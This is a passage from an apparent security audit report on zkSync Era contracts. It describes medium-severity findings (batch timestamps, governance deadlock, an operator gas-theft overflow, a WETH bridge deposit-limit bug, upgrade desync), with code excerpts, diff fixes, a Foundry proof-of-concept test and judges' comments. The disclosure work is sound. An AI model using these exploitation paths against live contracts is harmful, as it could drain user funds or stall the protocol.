    - Timestamp of the last block (fictive block) in this batch: `X + COMMIT_TIMESTAMP_APPROXIMATION_DELTA + Y + K`.
    - The time this batch is committed on L1: `blockTimestamp1001`.

During the timestamp verification of batch 1001 on L1, to meet the requirement:

    require(lastL2BlockTimestamp <= block.timestamp + COMMIT_TIMESTAMP_APPROXIMATION_DELTA, "h2");

We must have:

    X + COMMIT_TIMESTAMP_APPROXIMATION_DELTA + Y + K <= blockTimestamp1001 + COMMIT_TIMESTAMP_APPROXIMATION_DELTA

Simplifying the condition yields:

    Y + K <= blockTimestamp1001 - X

Here, `X` represents the time set by the operator, where `X <= blockTimestamp1000` as explained earlier. In the worst case scenario, if `X = blockTimestamp1000`, the condition becomes:

    Y + K <= blockTimestamp1001 - blockTimestamp1000

The variable `Y` signifies the amount of time required for the timestamp of batch 1001 to be higher than the timestamp of the last block in batch 1000. The minimum value of `Y` is 1 second. Assuming it is equal to 1 second (please note that if `Y` is higher than 1, the situation becomes even worse), the condition simplifies to:

    K <= blockTimestamp1001 - blockTimestamp1000 - 1

This condition imposes a critical limitation on the number of blocks that can be included in a batch. As a reminder, the timestamp of the first block in batch 1001 is `X + COMMIT_TIMESTAMP_APPROXIMATION_DELTA + Y`, while the timestamp of the last block in this batch is `X + COMMIT_TIMESTAMP_APPROXIMATION_DELTA + Y + K` (the fictive block). The difference between these two timestamps equals `K`, and since each block's timestamp must be greater than the previous block, `K` defines the maximum number of blocks allowed in a batch.

This condition has several implications:

- If both batches 1001 and 1000 are to be committed on L1 at the same time `blockTimestamp1000  = blockTimestamp1001` (in the same Ethereum block), it is not allowed, as `K <= -1`.
- Examining zkSync Era Explorer, it is evident that batches are frequently committed in the same Ethereum block. For example, by observing Ethereum block number 18383261, the function `commitBlocks` is called 19 times, with block positions ranging from 0 to 18. The following two transactions show just the first and the last `commitBlocks` in this Ethereum block.

<https://etherscan.io/tx/0xbfec43599bb73af95eaf4ac9ff83a62cdbe084382dd6f5d12bc8e817ce3574e5><br>
<https://etherscan.io/tx/0x1826d459ce7f2ab233374595569a13c4098e8e1eeb26517a98e42d9b5aab7374>

- The explorer demonstrates that the interval between committing batches is relatively short. For instance, if the interval is 30 seconds, a maximum of 29 blocks can be included in a batch.

- It's important to emphasize that batch 1000 has already undergone commitment, proof, and execution processes, and once these steps are completed, they are irreversible. Therefore, this issue will persist within the system.

- As mentioned in the document, L2 blocks are employed to reduce the time required for soft confirmation. However, due to the vulnerability explained earlier, there exists a stringent constraint on the number of blocks, resulting in an extended soft confirmation duration.

> L2 blocks were created for fast soft confirmation on wallets and block explorer. For example, MetaMask shows transactions as confirmed only after the block in which transaction execution was mined. So if the user needs to wait for the batch confirmation it would take at least minutes (for soft confirmation) and hours for full confirmation which is very bad UX. But API could return soft confirmation much earlier through L2 blocks.

<https://github.com/code-423n4/2023-10-zksync/blob/main/docs/Smart%20contract%20Section/Batches%20%26%20L2%20blocks%20on%20zkSync.md#motivation>

One potential solution is to commit batches on L1 with a longer delay to allow for more blocks to be included in batches. However, this approach may lead to other issues, such as an increased number of pending transactions and significantly extended finality.

Addressing this issue is not straightforward, and it would necessitate an upgrade of the `Executor` facet and a redesign of the timestamp verification process.

In summary, if the operator sets the timestamp of a batch too far into the future while still complying with L1 requirements, it can restrict the number of blocks that can be included in batches, resulting in a variety of challenges.

### Recommended Mitigation Steps

It is recommended that a more stricter timestamp constraint currently enforced in the `_verifyBatchTimestamp` function on L1 to also apply on L2. This will help prevent the creation and submission of batches with timestamps set in the distant future to L1. 

<https://github.com/code-423n4/2023-10-zksync/blob/main/code/contracts/ethereum/contracts/zksync/facets/Executor.sol#L94>

### Assessed type

Context

**[Alex the Entreprenerd (judge) decreased severity to Medium](https://github.com/code-423n4/2023-10-zksync-findings/issues/316#issuecomment-1826735946)**

**[anon (warden) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/316#issuecomment-1837474089):**
>  If the timestamp of a batch is set to its maximum valid value (which is `block.timestamp + COMMIT_TIMESTAMP_APPROXIMATION_DELTA`, in this case, `block.timestamp + 365 days`), it results in limitations on the speed of blocks and batches creation. Given that `L2_TX_MAX_GAS_LIMIT` is [equal](https://github.com/code-423n4/2023-10-zksync/blob/main/code/contracts/SystemConfig.json#L2) to `80,000,000`, and the maximum computation gas per batch is equal to `2^32` (explained [here](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/docs/Smart%20contract%20Section/zkSync%20fee%20model.md#system-wide-constants) and set [here](https://github.com/code-423n4/2023-10-zksync/blob/main/code/system-contracts/contracts/SystemContext.sol#L37)), roughly 53 transactions (calculated as `2^32 / 80,000,000`), each consuming the maximum `80,000,000` gas, will exhaust the gas capacity of a batch.
> 
> Consequently, the batch must be sealed, and another batch needs to be created to include additional transactions. If there is a high volume of transactions on the network, numerous batches must be created and committed on L1. Since the timestamp of the batch is set to the current timestamp plus 365 days, committing batches in a single L1 transaction becomes impossible. This is due to each batch's timestamp needing to be higher than the previous batch's timestamp, requiring the validator to wait between each batch commitment for the timestamp on L1 to elapse, thus passing this [check](https://github.com/code-423n4/2023-10-zksync/blob/main/code/contracts/ethereum/contracts/zksync/facets/Executor.sol#L94). This scenario can lead to several issues:
> 
> - Firstly, as indicated in the documentation, the value of `2^32` is arbitrary to prevent the state keeper from taking too much time. 
>   > The maximum number of computation gas per batch. This is the maximal number of gas that can be spent within a batch. This constant is rather arbitrary and is needed to prevent transactions from taking too much time from the state keeper. It can not be larger than the hard limit of `2^32` of gas for VM.
> 
>   The operator may also seal the batch earlier, as mentioned [here](https://github.com/code-423n4/2023-10-zksync/blob/main/code/system-contracts/bootloader/bootloader.yul#L3806). While this speeds up batch commitment on L1, the timestamp of the batch being set to the far future necessitates a delay between each commitment for the timestamp on L1 to elapse.
> 
> - Secondly, the assumption so far was that each batch consists of one block containing all transactions. However, the primary objective of having multiple blocks in a batch is to enhance the speed of soft confirmation, as explained [here](https://github.com/code-423n4/2023-10-zksync/blob/main/docs/Smart%20contract%20Section/Batches%20%26%20L2%20blocks%20on%20zkSync.md#motivation):
>   > L2 blocks were created for fast soft confirmation on wallets and block explorer. For example, MetaMask shows transactions as confirmed only after the block in which transaction execution was mined. So if the user needs to wait for the batch confirmation it would take at least minutes (for soft confirmation) and hours for full confirmation which is very bad UX. But API could return soft confirmation much earlier through L2 blocks.
> 
>   If the operator includes multiple blocks in a batch, it becomes limited on the L1 side during timestamp verification. Suppose batch 100 has a timestamp of `timestamp of the to-be-committed batch 100 + 365 days` and has 20 blocks. The 20th block must have a timestamp of at least `timestamp of the to-be-committed batch 100 + 365 days + 20 seconds`. When the validator commits this batch, it will be reverted [here](https://github.com/code-423n4/2023-10-zksync/blob/main/code/contracts/ethereum/contracts/zksync/facets/Executor.sol#L94) because `block.timestamp + 365 days + 20 seconds > block.timestamp + 365 days`. This indicates that having multiple blocks in a batch while the timestamp of the batch is set to the far future (to the edge of acceptable timestamp) will limit the frequency of batch commitment on L1 and restrict the number of blocks in a batch. In such a case, the validator should wait between each batch commitment on L1, potentially causing slow finality, impacting third parties dependent on that.
> 
> **Summary:**
> 
> Setting the timestamp of a batch to the far future will limit the speed of blocks and batches creation:
> - Including multiple blocks in a batch will be restricted during timestamp verification on L1 since the timestamp of the batch is already at the edge of the accepted timestamp.
> - Having only one block in a batch (to bypass the limitation mentioned above) contradicts the goal of having a block for fast finality.
> 
> Furthermore, in the case of a high volume of transactions on the network, this issue will be a significant limiting factor. If such a batch with a timestamp in the far future is executed, this limitation will persist in the protocol, as an executed batch cannot be reverted.


**[unforgiven (warden) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/316#issuecomment-1837501912):**
> I want to add that the underlying cause of Issue #316 is a security check that restricts the operator to submitting batches with timestamp far in the future(`ZKbatch.timestamp < Etherem.timestamp + DELTA`). This issue persists regardless of the DELTA value, even if set to zero. While this vulnerability exists, there are mitigating factors that diminish its severity:
> 
> - Due to the 12-second interval between Ethereum blocks, the operator can consistently generate and submit 12 batches within the next Ethereum block. The upper bound for batch timestamps, `Etherem.timestamp + DELTA`, increases by 12 seconds with each Ethereum block.
> - zkSync can always accommodate approximately 12 batch submissions in each subsequent Ethereum block, even under this attack. Batch timestamps can be set as `Etherem.timestamp + DELTA`, `Etherem.timestamp + DELTA +1`, `Etherem.timestamp + DELTA +2`,... `Etherem.timestamp + DELTA +11` and submitted to Ethereum. These timestamps will pass the `batch.timestamp < Etherem.timestamp + DELTA` check in the next Ethereum blocks due to the 12-second increase in Ethereum's timestamp.
> - Block numbers are determined by the operator, who can choose to include one block per batch or each transaction in a separate block within a batch. This is an operator-trusted function, and the number of blocks within each batch has no practical impact.
> - Operators and validators are trusted to submit batches. A malicious operator could simply refrain from submitting batches.
> 
> In conclusion, the security check `ZKbatch.timestamp < Etherem.timestamp + DELTA` does not impacts the average 12 batch submissions per Ethereum block, even if the operator sets batch timestamps to `Etherem.timestamp + DELTA`.

**[miladpiri (zkSync) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/316#issuecomment-1838287149):**
> I agree with anon's comment [here](https://github.com/code-423n4/2023-10-zksync-findings/issues/316#issuecomment-1837474089).

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/316#issuecomment-1848898451):**
 > The finding highlights a way for batch creation to be interrupted, this pertains to any configuration and is something that the operator could do under specific circumstances either willingly or by mistake. 

**[vladbochok (zkSync) disputed, disagreed with severity and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/316#issuecomment-1838287149):**
> The issue is highly theoretical and has a low impact in principle.
>
> Firstly validator should submit the batch with a timestamp in the future (+365 days). Even the validator is not trusted - this already has a huge impact on L2 protocols (all time-sensitive projects such as DeFi or oracles).
> 
> And then the only impact is that the validator can't commit batches for times of high load. Please note, that the validator can create batches and generate zkp for them, just can't submit `commitBatches` transaction by that moment. So, the validator can wait for a couple of minutes and then submit all batches. Moreover, currently, there is a delay between batch commits and batch execution by 21 hours. Due to this delay minutes in commits don't affect the time of execution, not saying that proof generation takes minutes, and sequencing in such a high load is questionable.

***

## [[M-13] Governance logic may enter a deadlock](https://github.com/code-423n4/2023-10-zksync-findings/issues/260)
*Submitted by [erebus](https://github.com/code-423n4/2023-10-zksync-findings/issues/260), also found by [Audittens](https://github.com/code-423n4/2023-10-zksync-findings/issues/801), [AkshaySrivastav](https://github.com/code-423n4/2023-10-zksync-findings/issues/771), [twcctop](https://github.com/code-423n4/2023-10-zksync-findings/issues/494), [anon](https://github.com/code-423n4/2023-10-zksync-findings/issues/364), and [don'tonka](https://github.com/code-423n4/2023-10-zksync-findings/issues/210)*

If any of the governance actors, either `securityCouncil` or `owner`, gets compromised, the whole governance logic will enter a deadlock (not a centralization risk as the `Governance` contract is exactly designed to prevent this kind of issues).

### Proof of concept

The actions that each governance actor can do are the following:

- `securityCouncil`
    - `cancel`
    - `execute`
    - `executeInstant`
- `owner`
    - `scheduleTransparent`
    - `scheduleShadow`
    - `cancel`
    - `execute`

By extension, as the `Governance` contract can call itself through `execute` and `executeInstant` and the only one who can propose upgrades is `owner`, then he can do the following too:

- `updateSecurityCouncil`
- `updateDelay`

It becomes clear that:

- If the `owner` gets compromised, then no one will ever make an upgrade again, as he is the only one who can submit one by calling `scheduleTransparent` or `scheduleShadow`.
- If the `securityCouncil` gets compromised, then he can spam `cancel` to ban all upgrades made by the `owner`, even the ones trying to remove `securityCouncil` by calling `updateSecurityCouncil`, as the `owner` cannot call `executeInstant` and the proposals delay (although not enforced) is supposed to be non-zero.

So the governance logic will be broken.

### Recommended Mitigation steps

After a talk with the sponsor, it seems in the future there will be some sort of escape hatch mechanism in which users will be able to withdraw their funds from zkSync Era to Ethereum or another L2 if any of the above happens. For the time being, the solutions we talked about were:

1. Removing the `cancel` permission of the `securityCouncil`:

```diff
-   function cancel(bytes32 _id) external onlyOwnerOrSecurityCouncil {
+   function cancel(bytes32 _id) external onlyOwner {
        require(isOperationPending(_id), "Operation must be pending");
        delete timestamps[_id];
        emit OperationCancelled(_id);
    }
```

2. Bounding by a minimum the possible delay (that way you prevent `owner` from virtually making instant upgrades):

[Governance, function updateDelay](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/governance/Governance.sol#L249C1-L252C6)

```diff
    function updateDelay(uint256 _newDelay) external onlySelf {
+       require(_newDelay >= MINIMUM_UPGRADE_DELAY, "whatever";)
        emit ChangeMinDelay(minDelay, _newDelay);
        minDelay = _newDelay;
    }
```

The constant `MINIMUM_UPGRADE_DELAY` is going to be a config one whose value is higher than the Solidity `1 day`, as withdrawals from zkSync Era to Ethereum takes around 1 day. Users would have enough time to withdraw their funds if a malicious upgrade is ever scheduled.

**[miladpiri (zkSync) confirmed and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/260#issuecomment-1801995240):**
 > If owner or security council are compromised, it breaks the full functionality of the governance mechanism. Indeed security council shouldn’t be able to break upgradability with delay. Medium can be fair.

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/260#issuecomment-1829787134):**
 > The Wardens have highlighted a governance deadlock scenario, which allows the security council to hold governance hostage.

***

## [[M-14] Operator can steal all gas provided by ANY user for `L1→L2` transactions](https://github.com/code-423n4/2023-10-zksync-findings/issues/255)
*Submitted by [erebus](https://github.com/code-423n4/2023-10-zksync-findings/issues/255), also found by [bin2chen](https://github.com/code-423n4/2023-10-zksync-findings/issues/749) and [anon](https://github.com/code-423n4/2023-10-zksync-findings/issues/187)*

In [bootloader, function processL1Tx](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L921C1-L921C57), it is possible for a malicious operator to steal all the gas provided by **ANY** user who requests an `L1⇒L2` transaction simply by returning an overinflated `refundGas` for the transaction execution.

### Proof of concept

The `refundGas` the user will receive is the sum of:

*Note: please see scenario in warden's [original submission](https://github.com/code-423n4/2023-10-zksync-findings/issues/255).*

With `reservedGas` being the excess of gas between what the user provided and what the operator is willing to use, and `refundGas` (not the final one) is the remaining gas left after preparing and executing the requested transaction.

As both quantities are added via the opcode `add`:

[bootloader, line 921](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L921C1-L921C57)

```solidity
                refundGas := add(refundGas, reservedGas)
```

The operator can return an over-inflated value so that it gets picked by the `max()` function and is added to `reservedGas`; overflowing the result as there are no checks for overflows in assembly:

[bootloader, lines 921-927](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L921C1-L927C100)

```solidity
                refundGas := add(refundGas, reservedGas) // overflow, refundGas = 0 while gasLimit != 0

                if gt(refundGas, gasLimit) { // correct, 0 < x for all x iff x != 0
                    assertionError("L1: refundGas > gasLimit")
                }

                // gasPrice * (gasLimit - refundGas) == gasPrice * (gasLimit - 0) == gasPrice * gasLimit
                let payToOperator := safeMul(gasPrice, safeSub(gasLimit, refundGas, "lpah"), "mnk")
```

As anyone will be able to be an operator once zkSync Era becomes decentralized, this issue becomes critical as it would be possible for **ANY** operator to *"farm"* the gas provided by **ANY** user.

### Recommended Mitigation Steps

Just use `safeAdd`:

[bootloader, line 921](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L921C1-L921C57)

```diff
-               refundGas := add(refundGas, reservedGas)
+               refundGas := safeAdd(refundGas, reservedGas, "The operator is being an asshole")
```

**[miladpiri (zkSync) confirmed via duplicate issue #187](https://github.com/code-423n4/2023-10-zksync-findings/issues/187#issuecomment-1795021187)**

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/255#issuecomment-1826401662):**
 > Best because of formula, clearest and shows the fix.

***

## [[M-15] `Mailbox.requestL2Transaction()` checks the deposit limit of `msg.sender` (`L1WethBridge`) instead of the real depositor of weth from L1, as a result, after certain time, nobody will be able to deposit weth anymore from L1](https://github.com/code-423n4/2023-10-zksync-findings/issues/246)
*Submitted by [chaduke](https://github.com/code-423n4/2023-10-zksync-findings/issues/246), also found by [chaduke](https://github.com/code-423n4/2023-10-zksync-findings/issues/329), [Udsen](https://github.com/code-423n4/2023-10-zksync-findings/issues/1111), [zero-idea](https://github.com/code-423n4/2023-10-zksync-findings/issues/895), [J4de](https://github.com/code-423n4/2023-10-zksync-findings/issues/785), [bin2chen](https://github.com/code-423n4/2023-10-zksync-findings/issues/747), [Aymen0909](https://github.com/code-423n4/2023-10-zksync-findings/issues/722), [Nyx](https://github.com/code-423n4/2023-10-zksync-findings/issues/587), [bart1e](https://github.com/code-423n4/2023-10-zksync-findings/issues/573), [anon](https://github.com/code-423n4/2023-10-zksync-findings/issues/511), [ladboy233](https://github.com/code-423n4/2023-10-zksync-findings/issues/264), [tapir](https://github.com/code-423n4/2023-10-zksync-findings/issues/181), [rvierdiiev](https://github.com/code-423n4/2023-10-zksync-findings/issues/29), and [mahdirostami](https://github.com/code-423n4/2023-10-zksync-findings/issues/851)*

### Proof of Concept

The `flow bridgeProxy.deposit() -> L1WethBridge.deposit() -> Mailbox.requestL2Transaction()` allows one to deposit WETH from L1 to L2.  However, when checking the deposit limit for a particular depositor, `Mailbox.requestL2Transaction()` checks the limit of `msg.sender`, which is the address of `L1WethBridge`.

<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L236-L273>

As a result, when the limit of the bridge is reached, nobody can deposit anymore, even though their limit is not reached yet. As a result, sooner or later, nobody will be able to use Zksync to deposit weth to L2 from L1.

POC:

1. We set the deposit limit to 10 ether.
2. User1 deposits 3 ether of weth and sends 0.1 ether of eth, this is successful, we have `s.totalDepositedAmountPerUser\[L1WethBridge] = 3.1` ether.
3. User2 deposits 4 ether of weth and 0.1 ether of eth. This is successful and we have `s.totalDepositedAmountPerUser\[L1WethBridge] = 7.2` ether.
4. User3 deposits 2.7 ether of weth and 0.1 weth. This is successful and we have `s.totalDepositedAmountPerUser\[L1WethBridge] = 10` ether. It has not exceeded the limit; however, if User3 deposits `2.7 ether + 1` of weth and 0.1 weth, then it will revert since now `s.totalDepositedAmountPerUser\[L1WethBridge] = 10 ether + 1`. Note that User3 has not exceeded its limit. However, the limit check is on `L1WethBridge`, not on User3, and that is the problem.

The following test file is a modification of the test file: `zksync/code/contracts/ethereum/test/foundry/unit/concrete/Bridge/L1WethBridge/Deposit.t.sol`. The test function is `test_DepositExceedLimit()`.

Please run the following command under `zksync/code/contracts/ethereum`:

`forge test --match-test test_DepositExceedLimit -vv`

The following line has been commented out to skip the check of merkle root:

<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L142>

```javascript
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "lib/forge-std/src/Test.sol";

import {L1WethBridgeTest} from "./_L1WethBridge_Shared.t.sol";
import {IAllowList} from "../../../../../../cache/solpp-generated-contracts/common/interfaces/IAllowList.sol";
import {REQUIRED_L2_GAS_PRICE_PER_PUBDATA} from "../../../../../../cache/solpp-generated-contracts/zksync/Config.sol";

contract DepositTest is L1WethBridgeTest {
    function deposit(address user, uint256 amount) private returns (bool) {
        hoax(user);
        l1Weth.deposit{value: amount}();

        hoax(user);
        l1Weth.approve(address(bridgeProxy), amount);

        bytes memory depositCallData = abi.encodeWithSelector(
            bridgeProxy.deposit.selector,
            user,
            bridgeProxy.l1WethAddress(),
            amount,
            1000000,                        // gas limit
            REQUIRED_L2_GAS_PRICE_PER_PUBDATA,
            user
        );

        hoax(user);
        (bool success, ) = address(bridgeProxy).call{value: 0.1 ether}(depositCallData); 
        return success;
    }

    function test_DepositExceedLimit() public {
        console.log("\n \n test_DepositExceeLimit is started....$$$$$$$$$$$$$$4");

        address user1 = address(111);
        address user2 = address(222);
        address user3 = address(333);

        vm.prank(owner);
        allowList.setDepositLimit(address(0), true, 10 ether); // deposit at most 10 ether
        IAllowList.Deposit memory limitData = IAllowList(allowList).getTokenDepositLimitData(address(0)); 
        assertEq(limitData.depositCap, 10 ether);

      

        bool success = deposit(user1, 3 ether); // send 3 ether weth and 0.1 ether eth
        assertTrue(success);


        success = deposit(user2, 4 ether); // send 4 ether weth and 0.1 ether eth
        assertTrue(success);

        success =  deposit(user3, 2.7 ether + 1); // send 2.7 ether + 1 weth  and 0.1 ether eth, now a total of 10ether + 1, will it exceed?  
        assertFalse(success);   // s.totalDepositedAmountPerUser[L1WethBridge] = 10 ether + 1, it exceeds the limit of 10 ether
    }
}
```

### Tools Used

Foundry, VScode

### Recommended Mitigation Steps

Check the limit of the real depositor instead of the limit for the `L1WethBridge`.

### Assessed type

Math

**[miladpiri (zkSync) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/246#issuecomment-1794494003):**
 > Deposit limitation is a temporary feature implemented to protect users from depositing large amount of fund into the protocol while it is in alpha mode. So, issues like this does not cause damage to the protocol. Medium can be a fair severity.

**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/246#issuecomment-1826015424):**
 > The Warden has shown how the implementation of limits, which are indexed by address, will cause the bridge to be subject to the caps that should apply to a single wallet. Since the finding would deny functionality but can technically be removed, I think Medium Severity to be most appropriate.

***

## [[M-16] Synchronization Issue Between L1 and L2 Upgrades](https://github.com/code-423n4/2023-10-zksync-findings/issues/214)
*Submitted by [anon](https://github.com/code-423n4/2023-10-zksync-findings/issues/214), also found by [0xsomeone](https://github.com/code-423n4/2023-10-zksync-findings/issues/728), [adeolu](https://github.com/code-423n4/2023-10-zksync-findings/issues/527), and [evmboi32](https://github.com/code-423n4/2023-10-zksync-findings/issues/140)*

1. **Protocol Version Discrepancy**: In cases where an L2 upgrade fails but is processed on L1 without concern for its execution result, the protocol version is advanced while the actual system remains unaltered on L2. This results in a discrepancy between the recorded protocol version and the operational state of the system.

2. **Unique Transaction Hash Requirement**: The protocol typically requires that the transaction hashes of L2 system upgrades be unique, with the `nonce` of the L2 upgrade transaction equal to the new protocol version. When an L2 upgrade fails but is not appropriately recognized on L1, this requirement is breached, necessitating a refactor of the contracts involved.

### Proof of Concept

In the course of an upgrade, the sequence of function calls is as follows:

`Governance::execute >> Governance::\_execute >> DiamondProxy::fallback >> Admin::executeUpgrade >> Diamond::diamondCut >> Diamond::\_initializeDiamondCut >> DefaultUpgrade::upgrade`

<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/upgrades/DefaultUpgrade.sol#L25>

During an upgrade, a new protocol version is established, and it should be numerically higher than the previous version.

<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/upgrades/DefaultUpgrade.sol#L28>

Let's examine two scenarios:

1. In the first case, if the upgrade includes an L1 upgrade and it fails to execute successfully, it will result in a rollback that reverses the entire upgrade transaction.

<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/governance/Governance.sol#L230>

2. In the second case, if the upgrade includes an L2 upgrade and it fails to execute successfully on L2, there's a challenge because the execution should take place on L2. As a result, it is unclear immediately whether the upgrade was successful.

The issue lies in the second case. Let's assume that the upgrade exclusively involves an L2 upgrade, and the upgrade transaction is executed on L1 such as the following flow of function calls:

`DefaultUpgrade::upgrade >> BaseZkSyncUpgrade::\_setL2SystemContractUpgrade`

Crucially, within this function, the transaction hash of the upgrade transaction is stored in `s.l2SystemContractsUpgradeTxHash`.

<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/upgrades/BaseZkSyncUpgrade.sol#L193>

Subsequently, this upgrade transaction should be executed on L2 with `_l2ProtocolUpgradeTx.txType = 254`. In the bootloader, when processing such a transaction type, the `canonicalL1TxHash` is sent natively to L1.

<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L587>

Following that, the `processL1Tx` function is invoked, in which the transaction is prepared and subsequently executed. 

<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L589>

During the execution, if, for any reason, such as running out of gas, the execution fails, the entire program does not revert. Instead, an L2 to L1 log is sent with `success = false`.

<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L908-L919><br>
<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L966>

On the L1 side, during the batch commitment, the function `_processL2Logs` is called. Within this function, a check is made to ensure that `_expectedSystemContractUpgradeTxHash` is equal to the `canonicalL1TxHash` associated with the L2 upgrade transaction.

<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Executor.sol#L157>

The issue stems from the fact that, during the execution of the batch, the `s.l2SystemContractsUpgradeTxHash` is cleared, regardless of the outcome of the L2 upgrade transaction on L2. To put it differently, on the L2 side, if the upgrade transaction is executed and returns a 'false' result, it signifies that the upgrade was not correctly implemented on L2. However, on the L1 side, it does not care about the outcome of the L2 upgrade transaction on L2, it only cares about the execution of the L2 upgrade transaction, regardless of its success or failure.

<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Executor.sol#L304>

The implications of this issue are as follows:

1. On L1, `s.l2SystemContractsUpgradeTxHash` becomes zero, indicating that the previous L2 upgrade has been completed. However, it's important to note that the protocol version was incremented despite the absence of an actual upgrade on L2 due to the unsuccessful execution. Consequently, the protocol version is raised without a corresponding system upgrade.

2. A discrepancy arises between `s.protocolVersion` and the new upgrade transaction. This discrepancy occurs because the protocol aims to have unique hashes for L2 system upgrade transactions, requiring that the `nonce` of the L2 upgrade transaction be equal to the new protocol version. Moreover, the new protocol version should be numerically higher than the previous one. Therefore, it appears that the contracts `DefaultUpgrade` and `BaseZkSyncUpgrade` require a revision to address this scenario.

<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/upgrades/BaseZkSyncUpgrade.sol#L217><br>
<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/upgrades/BaseZkSyncUpgrade.sol#L186>

3. The owner is required to schedule another upgrade, and this necessitates the passage of time for the delay between proposal and execution to elapse (in the case of a delayed upgrade).

### Recommended Mitigation Steps

One viable approach is to address this issue by incorporating the result of the L2 upgrade transaction into the batch execution process. If the L2 upgrade fails, this solution entails resetting the protocol version to its previous state. However, when an upgrade involves both L1 and L2 components, a straightforward rollback of the protocol version to its former state is not feasible, as the L1 upgrade has succeeded while the L2 counterpart has encountered difficulties.

    function executeBatches(StoredBatchInfo[] calldata _batchesData) external nonReentrant onlyValidator {
            //...

            uint256 batchWhenUpgradeHappened = s.l2SystemContractsUpgradeBatchNumber;
            if (batchWhenUpgradeHappened != 0 && batchWhenUpgradeHappened <= newTotalBatchesExecuted) {
                delete s.l2SystemContractsUpgradeTxHash;
                delete s.l2SystemContractsUpgradeBatchNumber;
                if (!proveL1ToL2TransactionStatus(...)){ // checking the L2 upgrade tx was successful or not
                   s.protocolVersion = s.OldProtocolVersion; // assuming the old protocol version is stored
                }
            }
        }

<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Executor.sol#L291>

### Assessed type

Context

**[miladpiri (zkSync) confirmed and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/214#issuecomment-1795027299):**
 > Medium is fair. We can make the bootloader fail if the upgrade transaction is unsuccessful. In general, it is a good idea that is needed to be implemented.

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/214#issuecomment-1830093471):**
 > The Warden has shown how, due to operative risks, a failed upgrade transaction can create a desynchronization between the upgraded version and the version reported.

*Note: For full discussion, see [here](https://github.com/code-423n4/2023-10-zksync-findings/issues/214).*

***

## [[M-17] Discrepancy in ECRECOVER Precompile when Using `Delegatecall`](https://github.com/code-423n4/2023-10-zksync-findings/issues/175)
*Submitted by [anon](https://github.com/code-423n4/2023-10-zksync-findings/issues/175), also found by [anon](https://github.com/code-423n4/2023-10-zksync-findings/issues/174) and [zkrunner](https://github.com/code-423n4/2023-10-zksync-findings/issues/1147)*

The discrepancy in `delegatecall` behavior with the ECRECOVER precompile contract in zkSync Era can have significant impact leading to incorrect signature validation, potentially compromising data integrity and user funds.

### Proof of Concept

In the context of zkSync Era, there exists a noticeable inconsistency in how the ECRECOVER precompile contract (located at address 0x01) behaves when accessed via `delegatecall`. This behavior differs from the standard Ethereum Virtual Machine (EVM) behavior, where the outcomes remain uniform across `call`, `staticcall`, and `delegatecall`.

